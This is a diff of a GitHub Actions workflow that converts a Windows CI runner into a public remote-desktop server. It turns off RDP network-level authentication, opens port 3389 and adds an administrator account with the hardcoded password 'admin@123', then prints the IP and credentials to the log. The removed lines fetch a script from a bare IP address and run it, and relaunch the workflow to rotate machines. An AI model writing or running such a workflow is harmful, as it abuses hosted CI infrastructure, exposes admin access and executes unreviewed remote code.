@@ -1,94 +1,26 @@
-name: RDP Rotate
+name: RDP
 
 on:
   workflow_dispatch:
 
 jobs:
   rdp:
-    runs-on: windows-latest
+    runs-on: windows-2019
     timeout-minutes: 60
     
     steps:
-      - name: Setup RDP
-        shell: pwsh
+      - shell: pwsh
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall delete rule name="RDP" 2>$null
           netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
           Restart-Service TermService -Force
-          
-          $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
-          if (Get-LocalUser -Name "user" -ErrorAction SilentlyContinue) {
-              Remove-LocalUser -Name "user" -Force
-          }
-          New-LocalUser -Name "user" -Password $password -AccountNeverExpires -PasswordNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "user"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "user"
-          
+          net user user admin@123 /add
+          net localgroup administrators user /add
+          net localgroup "Remote Desktop Users" user /add
           $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-          
-          Write-Host ""
-          Write-Host "============================================"
-          Write-Host "SERVER READY"
-          Write-Host "============================================"
           Write-Host "IP: $ip"
-          Write-Host "Port: 3389"
           Write-Host "User: user"
           Write-Host "Pass: admin@123"
-          Write-Host "============================================"
-          
-          $desktop = [Environment]::GetFolderPath("Desktop")
-          $infoFile = "$desktop\RDP_INFO.txt"
-          "IP: $ip`nUser: user`nPass: admin@123" | Out-File -FilePath $infoFile
-
-      - name: Download and Run Bot
-        shell: pwsh
-        run: |
-          $desktop = [Environment]::GetFolderPath("Desktop")
-          $botUrl = "http://31.57.97.230:5000/"
-          $botPath = "$desktop\bot.py"
-          
-          try {
-              $response = Invoke-WebRequest -Uri $botUrl -UseBasicParsing -TimeoutSec 30
-              $response.Content | Out-File -FilePath $botPath -Encoding UTF8
-          } catch {
-              Write-Host "Creating fallback bot..."
-              @"
-import time
-print("Bot running...")
-time.sleep(60)
-"@ | Out-File -FilePath $botPath -Encoding UTF8
-          }
-          
-          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
-          if (-not $pythonPath) {
-              $installer = "$env:TEMP\python.exe"
-              Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
-              Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
-              Remove-Item $installer -Force
-              Start-Sleep -Seconds 10
-              $pythonPath = "C:\Python311\python.exe"
-          }
-          
-          if (Test-Path $botPath) {
-              Start-Process -FilePath $pythonPath -ArgumentList "`"$botPath`"" -WindowStyle Normal
-          }
-
-      - name: Keep Alive and Rotate
-        shell: pwsh
-        run: |
-          $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-          $endTime = (Get-Date).AddMinutes(1)
-          
-          while ((Get-Date) -lt $endTime) {
-              Write-Host "[$(Get-Date)] Server active - RDP: $ip:3389"
-              Start-Sleep -Seconds 10
-          }
-          
-          Write-Host ""
-          Write-Host "🔄 Rotating to new server..."
-          gh workflow run "${{ github.workflow }}" --ref "${{ github.ref_name }}"
-        env:
-          GH_TOKEN: ${{ github.token }}
           
